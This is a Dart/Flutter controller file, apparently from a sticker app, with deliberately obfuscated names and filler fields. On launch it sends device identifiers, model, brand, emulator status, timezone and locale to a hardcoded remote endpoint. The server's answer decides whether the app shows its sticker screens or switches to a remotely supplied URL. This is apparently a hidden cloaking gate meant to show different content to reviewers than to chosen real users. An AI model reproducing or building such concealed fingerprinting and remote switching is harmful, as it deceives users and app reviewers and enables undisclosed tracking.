import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';


class PageLogic extends GetxController {

  var tzwbgcuqyl = RxBool(false);
  var ojmzydfat = RxBool(true);
  var nwdrm = RxString("");
  var marlen = RxBool(false);
  var williamson = RxBool(true);
  final cojqkd = Dio();


  InAppWebViewController? webViewController;

  dynamic algswrqki(){
    final xqakpt = InternetConnectionChecker.instance;
    final zuhljd = xqakpt.onStatusChange.skip(1).listen(
          (InternetConnectionStatus hcpqny) {
        if (hcpqny == InternetConnectionStatus.connected) {
          haxkt();
        } else {
          Get.toNamed('/noNetwork')?.then((_){
            haxkt();
          });
        }
      },
    );
    return zuhljd;
  }

  Future<bool> njeiophk() async {
    final bool cvtglm = await InternetConnectionChecker.instance.hasConnection;
    if(!cvtglm){
      Get.toNamed('/noNetwork')?.then((_){
        haxkt();
      });
    }
    return cvtglm;
  }

  @override
  void onInit() {
    super.onInit();
    algswrqki();
    haxkt();
  }


  Future<void> haxkt() async {

    var gfvwlkq = await njeiophk();
    if(!gfvwlkq){
      return;
    }

    marlen.value = true;
    williamson.value = true;
    ojmzydfat.value = false;

    cojqkd.post("https://mgt.monenfg.com/mzjwtusgfcnkayixrbolvqhdep",data: await nulfvw()).then((value) {
      var rmtwpya = value.data["rmtwpya"] as String;
      var gryun = value.data["gryun"] as bool;
      if (gryun) {
        nwdrm.value = rmtwpya;
        maurine();
      } else {
        emard();
      }
    }).catchError((e) {
      ojmzydfat.value = true;
      williamson.value = true;
      marlen.value = false;
    });
  }

  Future<Map<String, dynamic>> nulfvw() async {
    final DeviceInfoPlugin qftbi = DeviceInfoPlugin();
    PackageInfo edvhk_feskvlzx = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var nzjxf = Platform.localeName;
    var oipqg = currentTimeZone;

    var wtgchbi = edvhk_feskvlzx.packageName;
    var whnsul = edvhk_feskvlzx.version;
    var fxmcqtp = edvhk_feskvlzx.buildNumber;

    var kgjdmfx = edvhk_feskvlzx.appName;
    var jqufcwi = "";
    var owitv  = "";
    var sendi = "";
    var abigaleReichel = "";
    var nettieHeathcote = "";
    var eileenAuer = "";
    var lorenzaLittle = "";
    var loyceCollins = "";
    var kadenArmstrong = "";
    var kattieCruickshank = "";


    var dbpy = "";
    var civsjg = false;

    if (GetPlatform.isAndroid) {
      dbpy = "android";
      var wtknrlqap = await qftbi.androidInfo;

      sendi = wtknrlqap.brand;

      jqufcwi  = wtknrlqap.model;
      owitv = wtknrlqap.id;

      civsjg = wtknrlqap.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      dbpy = "ios";
      var mawpgejdx = await qftbi.iosInfo;
      sendi = mawpgejdx.name;
      jqufcwi = mawpgejdx.model;

      owitv = mawpgejdx.identifierForVendor ?? "";
      civsjg  = mawpgejdx.isPhysicalDevice;
    }
    var res = {
      "kgjdmfx": kgjdmfx,
      "fxmcqtp": fxmcqtp,
      "nettieHeathcote" : nettieHeathcote,
      "wtgchbi": wtgchbi,
      "jqufcwi": jqufcwi,
      "loyceCollins" : loyceCollins,
      "oipqg": oipqg,
      "lorenzaLittle" : lorenzaLittle,
      "sendi": sendi,
      "owitv": owitv,
      "nzjxf": nzjxf,
      "dbpy": dbpy,
      "civsjg": civsjg,
      "abigaleReichel" : abigaleReichel,
      "eileenAuer" : eileenAuer,
      "kadenArmstrong" : kadenArmstrong,
      "whnsul": whnsul,
      "kattieCruickshank" : kattieCruickshank,

    };
    return res;
  }

  Future<void> emard() async {
    Get.offAllNamed("/stickerTab");
  }

  Future<void> maurine() async {
    Get.offAllNamed("/stickerHa");
  }

  @override
  void dispose() {
    algswrqki().cancel();
    super.dispose();
  }

}
